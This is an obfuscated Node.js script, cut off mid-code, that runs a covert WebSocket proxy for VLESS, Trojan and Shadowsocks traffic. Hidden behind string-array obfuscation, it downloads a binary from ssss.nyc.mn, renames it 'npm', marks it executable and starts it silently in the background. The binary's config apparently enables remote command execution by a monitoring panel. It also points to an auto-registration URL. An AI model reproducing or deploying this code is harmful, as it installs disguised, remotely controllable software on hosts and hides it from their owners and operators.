 #!/usr/bin/env node

const _0x13fe6c=_0x26d8;(function(_0x124b05,_0x383147){const _0x487225={_0x4f6511:0x1e7,_0x254f27:0x1cb,_0x2ae7fe:0x1d7,_0x37d78e:0x1c7,_0x39def6:0x22a,_0x2b94f9:0x230},_0x7ad156=_0x26d8,_0x92dfd8=_0x124b05();while(!![]){try{const _0x5634bf=-parseInt(_0x7ad156(_0x487225._0x4f6511))/0x1+parseInt(_0x7ad156(_0x487225._0x254f27))/0x2+-parseInt(_0x7ad156(_0x487225._0x2ae7fe))/0x3+parseInt(_0x7ad156(_0x487225._0x37d78e))/0x4+-parseInt(_0x7ad156(_0x487225._0x39def6))/0x5+-parseInt(_0x7ad156(0x209))/0x6*(parseInt(_0x7ad156(0x237))/0x7)+-parseInt(_0x7ad156(0x223))/0x8*(-parseInt(_0x7ad156(_0x487225._0x2b94f9))/0x9);if(_0x5634bf===_0x383147)break;else _0x92dfd8['push'](_0x92dfd8['shift']());}catch(_0x1c04e0){_0x92dfd8['push'](_0x92dfd8['shift']());}}}(_0x27ba,0x6ab88));const os=require('os'),http=require(_0x13fe6c(0x244)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require(_0x13fe6c(0x23e)),{Buffer}=require(_0x13fe6c(0x22b)),{exec,execSync}=require(_0x13fe6c(0x1bb)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x13fe6c(0x20a)][_0x13fe6c(0x1ef)]||'3635af82-c996-4499-9f32-81e0e9054101',NEZHA_SERVER=process[_0x13fe6c(0x20a)][_0x13fe6c(0x1dd)]||'',NEZHA_PORT=process[_0x13fe6c(0x20a)][_0x13fe6c(0x1df)]||'',NEZHA_KEY=process[_0x13fe6c(0x20a)][_0x13fe6c(0x206)]||'',DOMAIN=process['env']['DOMAIN']||_0x13fe6c(0x21c),AUTO_ACCESS=process[_0x13fe6c(0x20a)][_0x13fe6c(0x21d)]||![],WSPATH=process[_0x13fe6c(0x20a)][_0x13fe6c(0x1d6)]||UUID[_0x13fe6c(0x233)](0x0,0x8),SUB_PATH=process[_0x13fe6c(0x20a)][_0x13fe6c(0x1f7)]||_0x13fe6c(0x1e1),NAME=process[_0x13fe6c(0x20a)]['NAME']||'',PORT=process[_0x13fe6c(0x20a)][_0x13fe6c(0x221)]||0xbb8;let uuid=UUID['replace'](/-/g,''),CurrentDomain=DOMAIN,Tls='tls',CurrentPort=0x1bb,ISP='';function _0x26d8(_0x38c5a9,_0x16dce7){const _0x27baa4=_0x27ba();return _0x26d8=function(_0x26d853,_0x1cda0b){_0x26d853=_0x26d853-0x1b6;let _0xb16085=_0x27baa4[_0x26d853];return _0xb16085;},_0x26d8(_0x38c5a9,_0x16dce7);}const DNS_SERVERS=[_0x13fe6c(0x22c),_0x13fe6c(0x1b6)],BLOCKED_DOMAINS=[_0x13fe6c(0x228),'fast.com',_0x13fe6c(0x1c4),'speed.cloudflare.com','speedof.me',_0x13fe6c(0x201),_0x13fe6c(0x1b8),_0x13fe6c(0x1e5),_0x13fe6c(0x205),_0x13fe6c(0x21b)];function isBlockedDomain(_0x91aa05){const _0x387c70=_0x13fe6c;if(!_0x91aa05)return![];const _0x4e0f86=_0x91aa05[_0x387c70(0x1f1)]();return BLOCKED_DOMAINS[_0x387c70(0x1d3)](_0x355498=>{const _0x211c0a=_0x387c70;return _0x4e0f86===_0x355498||_0x4e0f86[_0x211c0a(0x241)]('.'+_0x355498);});}async function getisp(){const _0xad7f80={_0x225a8b:0x216,_0x184c0d:0x1e3,_0x24d51f:0x239,_0x54bd85:0x20e,_0x5cd41b:0x21e},_0x4ac40d=_0x13fe6c;try{const _0x4870aa=await axios['get'](_0x4ac40d(_0xad7f80._0x225a8b),{'headers':{'User-Agent':_0x4ac40d(_0xad7f80._0x184c0d),'timeout':0xbb8}}),_0x163591=_0x4870aa[_0x4ac40d(0x1dc)];ISP=(_0x163591[_0x4ac40d(0x1fe)]+'-'+_0x163591['isp'])[_0x4ac40d(_0xad7f80._0x24d51f)](/ /g,'_');}catch(_0x322dee){try{const _0x5e4a85=await axios[_0x4ac40d(_0xad7f80._0x54bd85)](_0x4ac40d(_0xad7f80._0x5cd41b),{'headers':{'User-Agent':_0x4ac40d(_0xad7f80._0x184c0d),'timeout':0xbb8}}),_0x4a9595=_0x5e4a85[_0x4ac40d(0x1dc)];ISP=(_0x4a9595[_0x4ac40d(0x1ed)]+'-'+_0x4a9595['org'])[_0x4ac40d(_0xad7f80._0x24d51f)](/ /g,'_');}catch(_0x42f1e9){ISP='Unknown';}}}async function getip(){const _0xb25450={_0x5c5300:0x21c,_0x2fdbb4:0x1d9,_0x32c962:0x220},_0x17893a=_0x13fe6c;if(!DOMAIN||DOMAIN===_0x17893a(_0xb25450._0x5c5300))try{const _0x2eed5c=await axios[_0x17893a(0x20e)](_0x17893a(0x1f6),{'timeout':0x1388}),_0xb88b1=_0x2eed5c[_0x17893a(0x1dc)][_0x17893a(_0xb25450._0x2fdbb4)]();CurrentDomain=_0xb88b1,Tls='none',CurrentPort=PORT;}catch(_0x4fab3a){console[_0x17893a(0x204)](_0x17893a(0x1c8),_0x4fab3a[_0x17893a(_0xb25450._0x32c962)]),(CurrentDomain=_0x17893a(0x1c6),Tls=_0x17893a(0x20c),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x17893a(0x20c),CurrentPort=0x1bb;}function _0x27ba(){const _0x15faac=['data','NEZHA_SERVER','split','NEZHA_PORT','aarch64','u2pspl','then','Mozilla/5.0','trojan://','speed.io','sni%3D','261780vJuLKB','tls;','ss://','&fp=chrome&type=ws&host=','close','utf8','countryCode','utf-8','UUID','createServer','toLowerCase','Hello\x20world!','writeFileSync',';path%3D%2F','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://api-ipv4.ip.sb/ip','SUB_PATH','config.yaml','npm\x20running\x20error:','--tls','startsWith','Not\x20Found\x0a','2083','country_code','stream','vless://','testmy.net','forEach','Failed\x20to\x20resolve\x20','error','librespeed.org','NEZHA_KEY','\x20-p\x20','substr','528AZqBQh','env','once','tls','map','get','/bin/bash','application/dns-json','Server\x20is\x20running\x20on\x20port\x20','&path=%2F','sha224','\x20with\x20all\x20DNS\x20servers','every','https://api.ip.sb/geoip','npm','update','?security=','application/json','speedcheck.org','your-domain.com','AUTO_ACCESS','http://ip-api.com/json','join','message','PORT','log','1992zlfJmf','chmod\x20+x\x20npm','error:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','arch','speedtest.net','443','3669480oyMuKN','buffer','8.8.4.4','none:','includes','Automatic\x20Access\x20Task\x20added\x20successfully','43677mpTUZl','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','https://amd64.ssss.nyc.mn/agent','slice','base64','readUInt16BE','write','11613qtrnZd','concat','replace','length','index.html','Server','catch','crypto','readUInt8','type','endsWith','post','pipe','http','1.1.1.1','toString','bandwidth.place','arm','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','child_process','connect','8443',';skip-cert-verify%3Dtrue;mux%3D0#','pop','client_secret:\x20','finish','hex','reduce','speedtest.cn','https://oooo.serv00.net/add-url','cahnge-your-domain.com','2508292CRvUbP','Failed\x20to\x20get\x20IP','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','url','312614YmAhMA','text/plain','listen','createWriteStream','https://arm64.ssss.nyc.mn/agent','npm\x20download\x20successfully','end','writeHead','some','https://','&sni=','WSPATH','1238943QUEuQk','false','trim','&type=A','Answer'];_0x27ba=function(){return _0x15faac;};return _0x27ba();}const httpServer=http[_0x13fe6c(0x1f0)](async(_0x13434f,_0x1a8d0a)=>{const _0x46bb2f={_0x3d1033:0x21f,_0x3c54f3:0x20c,_0x196955:0x20c,_0x1a198f:0x1e8,_0x1de5e5:0x200,_0x56719d:0x1e4,_0x436e35:0x1d5,_0x153f4b:0x1ea,_0x1c8ee3:0x212,_0x48a226:0x1b7,_0xe2ece3:0x1e9,_0x220ad4:0x1f4,_0x2a398f:0x1be,_0x2364ce:0x1cc,_0x2cb5d8:0x1d1,_0x4c4546:0x1fc},_0x2f3ef9=_0x13fe6c;if(_0x13434f[_0x2f3ef9(0x1ca)]==='/'){const _0x1b5dc8=path[_0x2f3ef9(_0x46bb2f._0x3d1033)](__dirname,_0x2f3ef9(0x23b));fs['readFile'](_0x1b5dc8,_0x2f3ef9(0x1ec),(_0x53ef81,_0x2d8452)=>{const _0x47552a=_0x2f3ef9;if(_0x53ef81){_0x1a8d0a[_0x47552a(0x1d2)](0xc8,{'Content-Type':'text/html'}),_0x1a8d0a[_0x47552a(0x1d1)](_0x47552a(0x1f2));return;}_0x1a8d0a[_0x47552a(0x1d2)](0xc8,{'Content-Type':'text/html'}),_0x1a8d0a[_0x47552a(0x1d1)](_0x2d8452);});return;}else{if(_0x13434f['url']==='/'+SUB_PATH){await getisp(),await getip();const _0x6dccc6=NAME?NAME+'-'+ISP:ISP,_0x2481e2=Tls===_0x2f3ef9(_0x46bb2f._0x3c54f3)?_0x2f3ef9(_0x46bb2f._0x196955):'none',_0x159cb2=Tls==='tls'?_0x2f3ef9(_0x46bb2f._0x1a198f):'',_0x3b758b=_0x2f3ef9(_0x46bb2f._0x1de5e5)+UUID+'@'+CurrentDomain+':'+CurrentPort+'?encryption=none&security='+_0x2481e2+_0x2f3ef9(0x1d5)+CurrentDomain+_0x2f3ef9(0x1ea)+CurrentDomain+_0x2f3ef9(0x212)+WSPATH+'#'+_0x6dccc6,_0x29b897=_0x2f3ef9(_0x46bb2f._0x56719d)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x2f3ef9(0x219)+_0x2481e2+_0x2f3ef9(_0x46bb2f._0x436e35)+CurrentDomain+_0x2f3ef9(_0x46bb2f._0x153f4b)+CurrentDomain+_0x2f3ef9(_0x46bb2f._0x1c8ee3)+WSPATH+'#'+_0x6dccc6,_0x3c8825=Buffer['from'](_0x2f3ef9(0x22d)+UUID)[_0x2f3ef9(_0x46bb2f._0x48a226)](_0x2f3ef9(0x234)),_0x4315f2=_0x2f3ef9(_0x46bb2f._0xe2ece3)+_0x3c8825+'@'+CurrentDomain+':'+CurrentPort+_0x2f3ef9(0x231)+CurrentDomain+_0x2f3ef9(_0x46bb2f._0x220ad4)+WSPATH+';'+_0x159cb2+_0x2f3ef9(0x1e6)+CurrentDomain+_0x2f3ef9(_0x46bb2f._0x2a398f)+_0x6dccc6,_0x4d1823=_0x3b758b+'\x0a'+_0x29b897+'\x0a'+_0x4315f2,_0x18ea9a=Buffer['from'](_0x4d1823)[_0x2f3ef9(0x1b7)]('base64');_0x1a8d0a[_0x2f3ef9(0x1d2)](0xc8,{'Content-Type':_0x2f3ef9(0x1cc)}),_0x1a8d0a['end'](_0x18ea9a+'\x0a');}else _0x1a8d0a['writeHead'](0x194,{'Content-Type':_0x2f3ef9(_0x46bb2f._0x2364ce)}),_0x1a8d0a[_0x2f3ef9(_0x46bb2f._0x2cb5d8)](_0x2f3ef9(_0x46bb2f._0x4c4546));}});function resolveHost(_0x27c3aa){const _0x24c57f={_0x45c49f:0x23a,_0xdcfc67:0x214,_0x3d9fc0:0x210,_0x23a4e2:0x23d};return new Promise((_0x31c0af,_0x33f090)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x27c3aa)){_0x31c0af(_0x27c3aa);return;}let _0x5ad32d=0x0;function _0x364018(){const _0x4299b7={_0x64793c:0x1db,_0x561c18:0x1db},_0x391cf2=_0x26d8;if(_0x5ad32d>=DNS_SERVERS[_0x391cf2(_0x24c57f._0x45c49f)]){_0x33f090(new Error(_0x391cf2(0x203)+_0x27c3aa+_0x391cf2(_0x24c57f._0xdcfc67)));return;}const _0x50a8a7=DNS_SERVERS[_0x5ad32d];_0x5ad32d++;const _0x2f3aaf='https://dns.google/resolve?name='+encodeURIComponent(_0x27c3aa)+_0x391cf2(0x1da);axios['get'](_0x2f3aaf,{'timeout':0x1388,'headers':{'Accept':_0x391cf2(_0x24c57f._0x3d9fc0)}})[_0x391cf2(0x1e2)](_0xe5ce79=>{const _0x4f3fa4=_0x391cf2,_0x87ebfe=_0xe5ce79[_0x4f3fa4(0x1dc)];if(_0x87ebfe['Status']===0x0&&_0x87ebfe[_0x4f3fa4(_0x4299b7._0x64793c)]&&_0x87ebfe[_0x4f3fa4(_0x4299b7._0x561c18)][_0x4f3fa4(0x23a)]>0x0){const _0x678b41=_0x87ebfe[_0x4f3fa4(0x1db)]['find'](_0x12fab1=>_0x12fab1[_0x4f3fa4(0x240)]===0x1);if(_0x678b41){_0x31c0af(_0x678b41[_0x4f3fa4(0x1dc)]);return;}}_0x364018();})[_0x391cf2(_0x24c57f._0x23a4e2)](_0x2fba68=>{_0x364018();});}_0x364018();});}function handleVlsConnection(_0x240c5f,_0x15028a){const _0x4b670b={_0x4eca00:0x233,_0x56f311:0x233,_0x4bfc11:0x235,_0x1b7f22:0x23f,_0x25a484:0x233,_0x6c8fca:0x20d,_0x1a8701:0x21f,_0x1a0e7f:0x1e2},_0x33cb8a={_0x1c949d:0x233,_0x2fdda3:0x243,_0x46e044:0x204},_0x2a178b={_0x27fcd6:0x204},_0x2b956d=_0x13fe6c,[_0x1ef45e]=_0x15028a,_0x22fe06=_0x15028a[_0x2b956d(_0x4b670b._0x4eca00)](0x1,0x11);if(!_0x22fe06['every']((_0x701b03,_0x2d1f9d)=>_0x701b03==parseInt(uuid['substr'](_0x2d1f9d*0x2,0x2),0x10)))return![];let _0x4f0b58=_0x15028a[_0x2b956d(_0x4b670b._0x56f311)](0x11,0x12)['readUInt8']()+0x13;const _0x42f669=_0x15028a[_0x2b956d(0x233)](_0x4f0b58,_0x4f0b58+=0x2)[_0x2b956d(_0x4b670b._0x4bfc11)](0x0),_0xfb279c=_0x15028a[_0x2b956d(0x233)](_0x4f0b58,_0x4f0b58+=0x1)[_0x2b956d(0x23f)](),_0x1a6a83=_0xfb279c==0x1?_0x15028a[_0x2b956d(0x233)](_0x4f0b58,_0x4f0b58+=0x4)['join']('.'):_0xfb279c==0x2?new TextDecoder()['decode'](_0x15028a['slice'](_0x4f0b58+0x1,_0x4f0b58+=0x1+_0x15028a[_0x2b956d(0x233)](_0x4f0b58,_0x4f0b58+0x1)[_0x2b956d(_0x4b670b._0x1b7f22)]())):_0xfb279c==0x3?_0x15028a[_0x2b956d(_0x4b670b._0x25a484)](_0x4f0b58,_0x4f0b58+=0x10)[_0x2b956d(0x1c3)]((_0x57e016,_0x311136,_0x308d2b,_0x549420)=>_0x308d2b%0x2?_0x57e016[_0x2b956d(0x238)](_0x549420[_0x2b956d(0x233)](_0x308d2b-0x1,_0x308d2b+0x1)):_0x57e016,[])[_0x2b956d(_0x4b670b._0x6c8fca)](_0x1e6bad=>_0x1e6bad[_0x2b956d(0x235)](0x0)[_0x2b956d(0x1b7)](0x10))[_0x2b956d(_0x4b670b._0x1a8701)](':'):'';if(isBlockedDomain(_0x1a6a83))return _0x240c5f[_0x2b956d(0x1eb)](),![];_0x240c5f['send'](new Uint8Array([_0x1ef45e,0x0]));const _0x3b10a7=createWebSocketStream(_0x240c5f);return resolveHost(_0x1a6a83)[_0x2b956d(_0x4b670b._0x1a0e7f)](_0x28d250=>{const _0x34a52a={_0x3bbdab:0x233,_0x2bc19f:0x243,_0x45e61b:0x204},_0x27cf67=_0x2b956d;net['connect']({'host':_0x28d250,'port':_0x42f669},function(){const _0x189704=_0x26d8;this['write'](_0x15028a[_0x189704(_0x34a52a._0x3bbdab)](_0x4f0b58)),_0x3b10a7['on'](_0x189704(0x204),()=>{})[_0x189704(_0x34a52a._0x2bc19f)](this)['on'](_0x189704(_0x34a52a._0x45e61b),()=>{})['pipe'](_0x3b10a7);})['on'](_0x27cf67(_0x2a178b._0x27fcd6),()=>{});})[_0x2b956d(0x23d)](_0x3b3db4=>{const _0xa31f99=_0x2b956d;net[_0xa31f99(0x1bc)]({'host':_0x1a6a83,'port':_0x42f669},function(){const _0x5d5e9b=_0xa31f99;this['write'](_0x15028a[_0x5d5e9b(_0x33cb8a._0x1c949d)](_0x4f0b58)),_0x3b10a7['on']('error',()=>{})[_0x5d5e9b(_0x33cb8a._0x2fdda3)](this)['on'](_0x5d5e9b(_0x33cb8a._0x46e044),()=>{})['pipe'](_0x3b10a7);})['on']('error',()=>{});}),!![];}function handleTrojConnection(_0x3e1d6d,_0x4b79b8){const _0x1dc700={_0x32dbc3:0x1b7,_0x382c93:0x218,_0x4b94ef:0x1c2,_0x1031bb:0x233,_0x33b14c:0x20d,_0x32ee5b:0x21f,_0x576056:0x23a,_0x777cf6:0x1eb},_0x1a35ab={_0x2bd63e:0x236,_0x51cefc:0x204},_0x516ff8={_0x40c59d:0x1bc},_0x2eb05a={_0xd2d61b:0x236,_0x464a5a:0x233,_0x464679:0x204,_0x2d85f4:0x243},_0x21690f=_0x13fe6c;try{if(_0x4b79b8[_0x21690f(0x23a)]<0x3a)return![];const _0x2c0aa1=_0x4b79b8['slice'](0x0,0x38)[_0x21690f(_0x1dc700._0x32dbc3)](),_0x5f2e81=[UUID];let _0x2be35d=null;for(const _0x3649cc of _0x5f2e81){const _0x294475=crypto['createHash'](_0x21690f(0x213))[_0x21690f(_0x1dc700._0x382c93)](_0x3649cc)['digest'](_0x21690f(_0x1dc700._0x4b94ef));if(_0x294475===_0x2c0aa1){_0x2be35d=_0x3649cc;break;}}if(!_0x2be35d)return![];let _0x2f0957=0x38;_0x4b79b8[_0x2f0957]===0xd&&_0x4b79b8[_0x2f0957+0x1]===0xa&&(_0x2f0957+=0x2);const _0x4a706f=_0x4b79b8[_0x2f0957];if(_0x4a706f!==0x1)return![];_0x2f0957+=0x1;const _0x292aa2=_0x4b79b8[_0x2f0957];_0x2f0957+=0x1;let _0x28499a,_0x1796fe;if(_0x292aa2===0x1)_0x28499a=_0x4b79b8[_0x21690f(_0x1dc700._0x1031bb)](_0x2f0957,_0x2f0957+0x4)['join']('.'),_0x2f0957+=0x4;else{if(_0x292aa2===0x3){const _0x72e14d=_0x4b79b8[_0x2f0957];_0x2f0957+=0x1,_0x28499a=_0x4b79b8['slice'](_0x2f0957,_0x2f0957+_0x72e14d)[_0x21690f(0x1b7)](),_0x2f0957+=_0x72e14d;}else{if(_0x292aa2===0x4)_0x28499a=_0x4b79b8['slice'](_0x2f0957,_0x2f0957+0x10)[_0x21690f(0x1c3)]((_0x40a3cc,_0x4f99df,_0xe9db04,_0xd46d20)=>_0xe9db04%0x2?_0x40a3cc['concat'](_0xd46d20[_0x21690f(0x233)](_0xe9db04-0x1,_0xe9db04+0x1)):_0x40a3cc,[])[_0x21690f(_0x1dc700._0x33b14c)](_0x1e27f9=>_0x1e27f9[_0x21690f(0x235)](0x0)[_0x21690f(0x1b7)](0x10))[_0x21690f(_0x1dc700._0x32ee5b)](':'),_0x2f0957+=0x10;else return![];}}_0x1796fe=_0x4b79b8['readUInt16BE'](_0x2f0957),_0x2f0957+=0x2;_0x2f0957<_0x4b79b8[_0x21690f(_0x1dc700._0x576056)]&&_0x4b79b8[_0x2f0957]===0xd&&_0x4b79b8[_0x2f0957+0x1]===0xa&&(_0x2f0957+=0x2);if(isBlockedDomain(_0x28499a))return _0x3e1d6d[_0x21690f(_0x1dc700._0x777cf6)](),![];const _0x53880d=createWebSocketStream(_0x3e1d6d);return resolveHost(_0x28499a)['then'](_0x1de825=>{const _0x483bda=_0x21690f;net[_0x483bda(_0x516ff8._0x40c59d)]({'host':_0x1de825,'port':_0x1796fe},function(){const _0x303cd6=_0x483bda;_0x2f0957<_0x4b79b8['length']&&this[_0x303cd6(_0x2eb05a._0xd2d61b)](_0x4b79b8[_0x303cd6(_0x2eb05a._0x464a5a)](_0x2f0957)),_0x53880d['on'](_0x303cd6(_0x2eb05a._0x464679),()=>{})['pipe'](this)['on'](_0x303cd6(0x204),()=>{})[_0x303cd6(_0x2eb05a._0x2d85f4)](_0x53880d);})['on'](_0x483bda(0x204),()=>{});})[_0x21690f(0x23d)](_0x197490=>{net['connect']({'host':_0x28499a,'port':_0x1796fe},function(){const _0x5990de=_0x26d8;_0x2f0957<_0x4b79b8[_0x5990de(0x23a)]&&this[_0x5990de(_0x1a35ab._0x2bd63e)](_0x4b79b8[_0x5990de(0x233)](_0x2f0957)),_0x53880d['on'](_0x5990de(_0x1a35ab._0x51cefc),()=>{})[_0x5990de(0x243)](this)['on']('error',()=>{})['pipe'](_0x53880d);})['on']('error',()=>{});}),!![];}catch(_0x2ee5e7){return![];}}function handleSsConnection(_0x195563,_0x3008b8){const _0x1a69ec={_0x2c37ea:0x233,_0x45c1c3:0x1e2,_0x5a7350:0x23d},_0xd3a898={_0x5ddaf6:0x204},_0x311a40={_0x519ced:0x236,_0x4b0691:0x233,_0x2f9255:0x204,_0x3a069e:0x243},_0x307827={_0x2188ef:0x1bc},_0x2b8648={_0x2deb1e:0x23a},_0x2e4a5f=_0x13fe6c;try{let _0x2b665f=0x0;const _0x47070e=_0x3008b8[_0x2b665f];_0x2b665f+=0x1;let _0x596a8e,_0x2b98af;if(_0x47070e===0x1)_0x596a8e=_0x3008b8['slice'](_0x2b665f,_0x2b665f+0x4)['join']('.'),_0x2b665f+=0x4;else{if(_0x47070e===0x3){const _0x5aacb9=_0x3008b8[_0x2b665f];_0x2b665f+=0x1,_0x596a8e=_0x3008b8[_0x2e4a5f(_0x1a69ec._0x2c37ea)](_0x2b665f,_0x2b665f+_0x5aacb9)[_0x2e4a5f(0x1b7)](),_0x2b665f+=_0x5aacb9;}else{if(_0x47070e===0x4)_0x596a8e=_0x3008b8['slice'](_0x2b665f,_0x2b665f+0x10)[_0x2e4a5f(0x1c3)]((_0x12f747,_0x365abd,_0x30ef8e,_0x5018e2)=>_0x30ef8e%0x2?_0x12f747[_0x2e4a5f(0x238)](_0x5018e2['slice'](_0x30ef8e-0x1,_0x30ef8e+0x1)):_0x12f747,[])[_0x2e4a5f(0x20d)](_0x3150e3=>_0x3150e3['readUInt16BE'](0x0)[_0x2e4a5f(0x1b7)](0x10))['join'](':'),_0x2b665f+=0x10;else return![];}}_0x2b98af=_0x3008b8['readUInt16BE'](_0x2b665f),_0x2b665f+=0x2;if(isBlockedDomain(_0x596a8e))return _0x195563[_0x2e4a5f(0x1eb)](),![];const _0x47b8c7=createWebSocketStream(_0x195563);return resolveHost(_0x596a8e)[_0x2e4a5f(_0x1a69ec._0x45c1c3)](_0x1ff564=>{const _0x382790=_0x2e4a5f;net[_0x382790(_0x307827._0x2188ef)]({'host':_0x1ff564,'port':_0x2b98af},function(){const _0x55caae=_0x382790;_0x2b665f<_0x3008b8[_0x55caae(_0x2b8648._0x2deb1e)]&&this[_0x55caae(0x236)](_0x3008b8[_0x55caae(0x233)](_0x2b665f)),_0x47b8c7['on'](_0x55caae(0x204),()=>{})['pipe'](this)['on'](_0x55caae(0x204),()=>{})['pipe'](_0x47b8c7);})['on']('error',()=>{});})[_0x2e4a5f(_0x1a69ec._0x5a7350)](_0x3cf9a5=>{const _0x2b61a5=_0x2e4a5f;net[_0x2b61a5(0x1bc)]({'host':_0x596a8e,'port':_0x2b98af},function(){const _0x11025a=_0x2b61a5;_0x2b665f<_0x3008b8[_0x11025a(0x23a)]&&this[_0x11025a(_0x311a40._0x519ced)](_0x3008b8[_0x11025a(_0x311a40._0x4b0691)](_0x2b665f)),_0x47b8c7['on'](_0x11025a(0x204),()=>{})[_0x11025a(0x243)](this)['on'](_0x11025a(_0x311a40._0x2f9255),()=>{})[_0x11025a(_0x311a40._0x3a069e)](_0x47b8c7);})['on'](_0x2b61a5(_0xd3a898._0x5ddaf6),()=>{});}),!![];}catch(_0x362eb4){return![];}}const wss=new WebSocket[(_0x13fe6c(0x23c))]({'server':httpServer});wss['on']('connection',(_0x1fd86f,_0x287910)=>{const _0x33223b={_0x2ba45e:0x1ca,_0x399136:0x1fb,_0x28a588:0x20b,_0x1902cd:0x220},_0x18bf4b={_0x4ef670:0x215,_0x35b5b8:0x1eb,_0x23ba52:0x23a},_0x4ab844=_0x13fe6c,_0x94fb03=_0x287910[_0x4ab844(_0x33223b._0x2ba45e)]||'',_0x1352ec='/'+WSPATH;if(!_0x94fb03[_0x4ab844(_0x33223b._0x399136)](_0x1352ec)){_0x1fd86f['close']();return;}_0x1fd86f[_0x4ab844(_0x33223b._0x28a588)](_0x4ab844(_0x33223b._0x1902cd),_0x3327ce=>{const _0x542608=_0x4ab844;if(_0x3327ce['length']>0x11&&_0x3327ce[0x0]===0x0){const _0x25756a=_0x3327ce['slice'](0x1,0x11),_0x785d32=_0x25756a[_0x542608(_0x18bf4b._0x4ef670)]((_0x46eddf,_0x13a321)=>_0x46eddf==parseInt(uuid[_0x542608(0x208)](_0x13a321*0x2,0x2),0x10));if(_0x785d32){!handleVlsConnection(_0x1fd86f,_0x3327ce)&&_0x1fd86f[_0x542608(_0x18bf4b._0x35b5b8)]();return;}}if(_0x3327ce['length']>=0x3a){if(handleTrojConnection(_0x1fd86f,_0x3327ce))return;}if(_0x3327ce[_0x542608(_0x18bf4b._0x23ba52)]>0x0&&(_0x3327ce[0x0]===0x1||_0x3327ce[0x0]===0x3||_0x3327ce[0x0]===0x4)){if(handleSsConnection(_0x1fd86f,_0x3327ce))return;}_0x1fd86f['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x489dd3={_0x70c76:0x227,_0x34fc80:0x1e0,_0x8a1d8e:0x1cf},_0x5aecf4=_0x13fe6c,_0x34640d=os[_0x5aecf4(_0x489dd3._0x70c76)]();return _0x34640d===_0x5aecf4(0x1b9)||_0x34640d==='arm64'||_0x34640d===_0x5aecf4(_0x489dd3._0x34fc80)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x5aecf4(_0x489dd3._0x8a1d8e):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x5aecf4(0x232);},downloadFile=async()=>{const _0x5dc222={_0x2b1f5d:0x1ff,_0x195bb5:0x217,_0x1b0989:0x1dc},_0x3c84b5={_0x588a2a:0x204},_0x30b378=_0x13fe6c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x484754=getDownloadUrl(),_0x2fa1a7=await axios({'method':_0x30b378(0x20e),'url':_0x484754,'responseType':_0x30b378(_0x5dc222._0x2b1f5d)}),_0xebbf05=fs[_0x30b378(0x1ce)](_0x30b378(_0x5dc222._0x195bb5));return _0x2fa1a7[_0x30b378(_0x5dc222._0x1b0989)][_0x30b378(0x243)](_0xebbf05),new Promise((_0x33978e,_0x48ae45)=>{const _0xf0de76=_0x30b378;_0xebbf05['on'](_0xf0de76(0x1c1),()=>{const _0x51a2b3=_0xf0de76;console[_0x51a2b3(0x222)](_0x51a2b3(0x1d0)),exec(_0x51a2b3(0x224),_0x3d7faa=>{if(_0x3d7faa)_0x48ae45(_0x3d7faa);_0x33978e();});}),_0xebbf05['on'](_0xf0de76(_0x3c84b5._0x588a2a),_0x48ae45);});}catch(_0x1bfb0b){throw _0x1bfb0b;}},runnz=async()=>{const _0x128647={_0x5a4265:0x222,_0x34ae3b:0x229,_0x10d3eb:0x1bd,_0x3b0026:0x1fd,_0x25edbb:0x1fa,_0x29c1da:0x1de,_0x5cc8c1:0x22e,_0x2629b7:0x1ba,_0xb396dc:0x1c9,_0x359cd9:0x1f8,_0x16db6b:0x204},_0x567756={_0x46449d:0x204,_0x5ad8ec:0x1f9},_0x171213=_0x13fe6c;try{const _0x2791c7=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x171213(0x1ee)});if(_0x2791c7[_0x171213(0x1d9)]()!==''){console[_0x171213(_0x128647._0x5a4265)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x7145f9){}await downloadFile();let _0x586803='',_0x27e02a=[_0x171213(_0x128647._0x34ae3b),_0x171213(_0x128647._0x10d3eb),'2096','2087',_0x171213(_0x128647._0x3b0026),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5efd04=_0x27e02a['includes'](NEZHA_PORT)?_0x171213(_0x128647._0x25edbb):'';_0x586803='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x171213(0x207)+NEZHA_KEY+'\x20'+_0x5efd04+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2622f4=NEZHA_SERVER[_0x171213(0x22e)](':')?NEZHA_SERVER[_0x171213(_0x128647._0x29c1da)](':')[_0x171213(0x1bf)]():'',_0x59a543=_0x27e02a[_0x171213(_0x128647._0x5cc8c1)](_0x2622f4)?'true':_0x171213(0x1d8),_0xa34bc=_0x171213(0x1c0)+NEZHA_KEY+_0x171213(0x226)+NEZHA_SERVER+_0x171213(_0x128647._0x2629b7)+_0x59a543+_0x171213(_0x128647._0xb396dc)+UUID;fs[_0x171213(0x1f3)](_0x171213(_0x128647._0x359cd9),_0xa34bc);}_0x586803=_0x171213(0x1f5);}else return;}try{exec(_0x586803,{'shell':_0x171213(0x20f)},_0x1201dc=>{const 